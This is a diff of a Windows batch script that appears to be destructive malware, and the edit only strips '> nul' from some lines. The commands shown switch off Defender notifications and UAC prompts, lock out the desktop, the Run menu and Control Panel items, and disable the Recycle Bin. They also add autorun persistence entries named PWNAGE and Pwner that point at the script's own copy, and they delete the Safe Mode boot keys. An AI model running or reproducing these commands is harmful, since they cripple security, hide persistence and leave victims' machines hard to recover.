@@ -90,8 +90,8 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoClo
 eg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
 reg add "HKCU\Software\Microsoft\Notepad" /v iPointSize /t REG_DWORD /d 36 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d "1" /f > nul
-reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Run /t REG_DWORD /d "0" /f > nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Run /t REG_DWORD /d "0" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v Disabled  /t REG_DWORD /d "01" /f 
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v NoRealMode  /t REG_DWORD /d "01" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d "1"
@@ -99,15 +99,15 @@ reg add HKCU\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policie
 reg add HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Restrictions /v NoBrowserClose /t REG_DWORD /d "1"
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDispCPL /t REG_DWORD /d "1"
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d "1"
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:Windows /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:Windows /t REG_DWORD /d "1" /f
 set iconPath="C:\ProgramData\Microsoft\Device Stage\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\pictures.ico"
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconVerticalSpacing /t REG_SZ /d -1500 /f
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v Shell Icon Size /t REG_SZ /d 32 /f
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_DWORD /d 0 /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_SZ /d %iconPath% /f
 reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v ColorPrevalence /t REG_DWORD /d 2 /f
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f >nul
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f >nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f 
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f
 reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
 reg delete "HKEY_CURRENT_USER\Identities" /f
 reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f
@@ -124,8 +124,8 @@ reg add "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogon" /v "@mmres.dll,-5
 reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d "2" /f
 reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
 reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f
-reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
-reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f
 reg add "HKEY_CURRENT_CONFIG\Software\Fonts" /v LogPixels /t REG_DWORD /d 73 /f
 reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f
 reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f
